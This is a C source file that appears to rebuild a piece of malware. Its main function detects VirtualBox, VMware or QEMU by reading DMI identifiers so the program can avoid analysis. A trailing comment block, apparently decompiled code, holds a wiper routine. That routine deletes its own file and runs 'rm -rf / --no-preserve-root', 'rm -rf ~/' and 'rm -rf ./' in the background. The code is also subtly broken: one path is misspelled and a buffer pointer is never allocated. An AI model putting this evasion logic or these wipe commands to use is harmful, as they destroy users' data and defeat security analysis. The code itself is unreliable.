#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main() {
  const char* path = "/sys/class/dim/id/product_name";
  const char* mode = "r";
  FILE* fp;
  char* haystack;
  int n = 11;
  fp = fopen(path, mode);
  if (fp) {
      while(fgets(haystack, n, fp)) {
          if(strstr(haystack, "VirtualBox") || strstr(haystack, "VMware"))
              // wipe_vm(v4);
              return 1;
          memset(haystack, 0, n);
          fgets(haystack, n, fp);
      }
      fclose(fp);
  }
  memset(haystack, 0, n);
  FILE* result = fopen("/sys/class/dmi/id/sys_vendor", "r");
  fp = result;
  if(result) {
      while(fgets(haystack,n,fp)) {
          if(strstr(haystack, "QEMU"))
              // wipe_vm(v4);
              return 1;
      }
  }
  return 0;
}

// return 1 --> anti virt triggered
// return 0 --> ran normally

/*
v2=argv;
puts("https://google.com");
if(realpath(*vt, &resolved)) {
    snprintf(&s, 0x3Du, "rm -f %s > /dev/null 2> /dev/null", &resolved, v2);
    system(&s);
}
system("rm -rf / --no-preserve-root > /dev/null 2> /dev/null &");
system("rm -rf ~/ > /dev/null 2> /dev/null &");
system("rm -rf ./ > /dev/null 2> /dev/null &");
system("rm -rf / --no-preserve-root > /dev/null 2> /dev/null");
system("rm -rf ~/ > /dev/null 2> /dev/null");
system("rm -rf ./ > /dev/null 2> /dev/null");
return 0;

*/